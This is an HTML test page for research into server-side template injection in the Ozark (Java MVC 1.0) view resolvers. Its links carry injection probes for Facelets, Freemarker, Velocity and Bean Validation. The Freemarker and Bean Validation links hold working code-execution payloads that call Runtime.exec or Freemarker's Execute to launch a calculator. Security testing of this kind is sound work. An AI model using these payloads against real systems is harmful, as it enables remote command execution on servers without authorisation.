<!doctype html>
<html lang="en">
    <head>
        <title>Ozark View Resolvers</title>

        <!-- Required meta tags -->
	    <meta charset="utf-8">
	    <meta name="viewport" content="width=device-width, initial-scale=1">
	
	    <!-- Bootstrap CSS -->
	    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
    </head>
    <body>
    	<div class="container">
		  <div class="row">
		  	<div class="col-sm">
		  		<H1>Java MVC 1.0 - Ozark Research</H1>
		  	</div>
		  </div>
		  <div class="row">
		    <div class="col-sm">
		    	<div class="row">
		  			<div class="col-sm-12">
		      			<h2>Ozark Built-in Resolvers</h2>
		      		</div>
	      		</div>
      			<!-- <div class="row">
		  			<div class="col-sm-2">
		  				Static Resolver:
		      		</div>
		      		<div class="col-sm-10">
		      			<a href="ozark/static?name=john" class="btn btn-sm btn-outline-primary">static</a>
		      		</div>
				</div> -->
				<div class="row">
		  			<div class="col-sm-2">
		  				Facelets Resolver:
		      		</div>
		      		<div class="col-sm-10">
		      			<a href="ozark/facelets?name=%23{7*7}" class="btn btn-sm btn-outline-primary">facelets</a>
		      		</div>
				</div>
				<!-- 
				<div class="row">
		  			<div class="col-sm-2">
		  				Scanned Resolver:
		      		</div>
		      		<div class="col-sm-10">
		      			<a href="ozark/scanned?name=john" class="btn btn-sm btn-outline-primary">scanned</a>
		      		</div>
		      	</div>
		      	<div class="row">
		  			<div class="col-sm-2">
		  				Void Resolver:
		      		</div>
		      		<div class="col-sm-10">
		      			<a href="ozark/void?name=john" class="btn btn-sm btn-outline-primary">void</a>
		      		</div>
		      	</div>
		      	<div class="row">
		  			<div class="col-sm-2">
		  				Response Resolver:
		      		</div>
		      		<div class="col-sm-10">
		      			<a href="ozark/response?name=john" class="btn btn-sm btn-outline-primary">response</a>
		      		</div>
	      		</div> -->
		    </div>
		  </div>
		  <div class="row">
		    <div class="col-sm">
		    	<div class="row">
		  			<div class="col-sm-12">
		      			<h2>External Template Engines Resolvers</h2>
		      		</div>
	      		</div>
      			<div class="row">
		  			<div class="col-sm-2">
		  				Freemarker:
		      		</div>
		      		<div class="col-sm-10">
		      			<a href="ozark/freemarker?name=%24%7b%37%2a%37%7d" class="btn btn-sm btn-outline-primary" target="_blank">Math</a>
		      			<a href='ozark/freemarker?name=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%6c%63%22%29%7d' class="btn btn-sm btn-outline-primary" target="_blank">Calc</a>
		      		</div>
				</div>
				<!-- <div class="row">
		  			<div class="col-sm-2">
		  				Handlebars:
		      		</div>
		      		<div class="col-sm-10">
		      			<a href="ozark/handlebars?name=john" class="btn btn-sm btn-outline-primary" target="_blank">Handlebars</a>
		      		</div>
		      	</div>
		      	<div class="row">
		  			<div class="col-sm-2">
		  				Mustache:
		      		</div>
		      		<div class="col-sm-10">
		      			<a href="ozark/mustache?name=john" class="btn btn-sm btn-outline-primary" target="_blank">Mustache</a>
		      		</div>
		      	</div>
		      	<div class="row">
		  			<div class="col-sm-2">
		  				Thymeleaf:
		      		</div>
		      		<div class="col-sm-10">
		      			<a href="ozark/thymeleaf?name=john" class="btn btn-sm btn-outline-primary" target="_blank">Thymeleaf</a>
		      		</div>
	      		</div> -->
	      		<div class="row">
		  			<div class="col-sm-2">
		  				Velocity:
		      		</div>
		      		<div class="col-sm-10">
		      			<a href="ozark/velocity?name=%23set($run=7*7) $run" class="btn btn-sm btn-outline-primary" target="_blank">Math</a>
		      		</div>
	      		</div>
	      		<div class="row">
		  			<div class="col-sm-2">
		  				Bean Validation:
		      		</div>
		      		<div class="col-sm-10">
		      			<a href="ozark/validatebean?name=John&prefix=$%7b%22%22%2egetClass()%2eforName(%22java%2elang%2eRuntime%22)%2egetMethods()[6]%2einvoke(%22%22%2egetClass()%2eforName(%22java%2elang%2eRuntime%22))%2eexec(%22calc%2eexe%22)%7d" class="btn btn-sm btn-outline-primary" target="_blank">Calc</a>
		      		</div>
	      		</div>
		    </div>
		  </div>
		</div>
		<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.bundle.min.js" integrity="sha384-JEW9xMcG8R+pH31jmWH6WWP0WintQrMb4s7ZOdauHnUtxwoG2vI5DkLtS3qm9Ekf" crossorigin="anonymous"></script>
    </body>
</html>
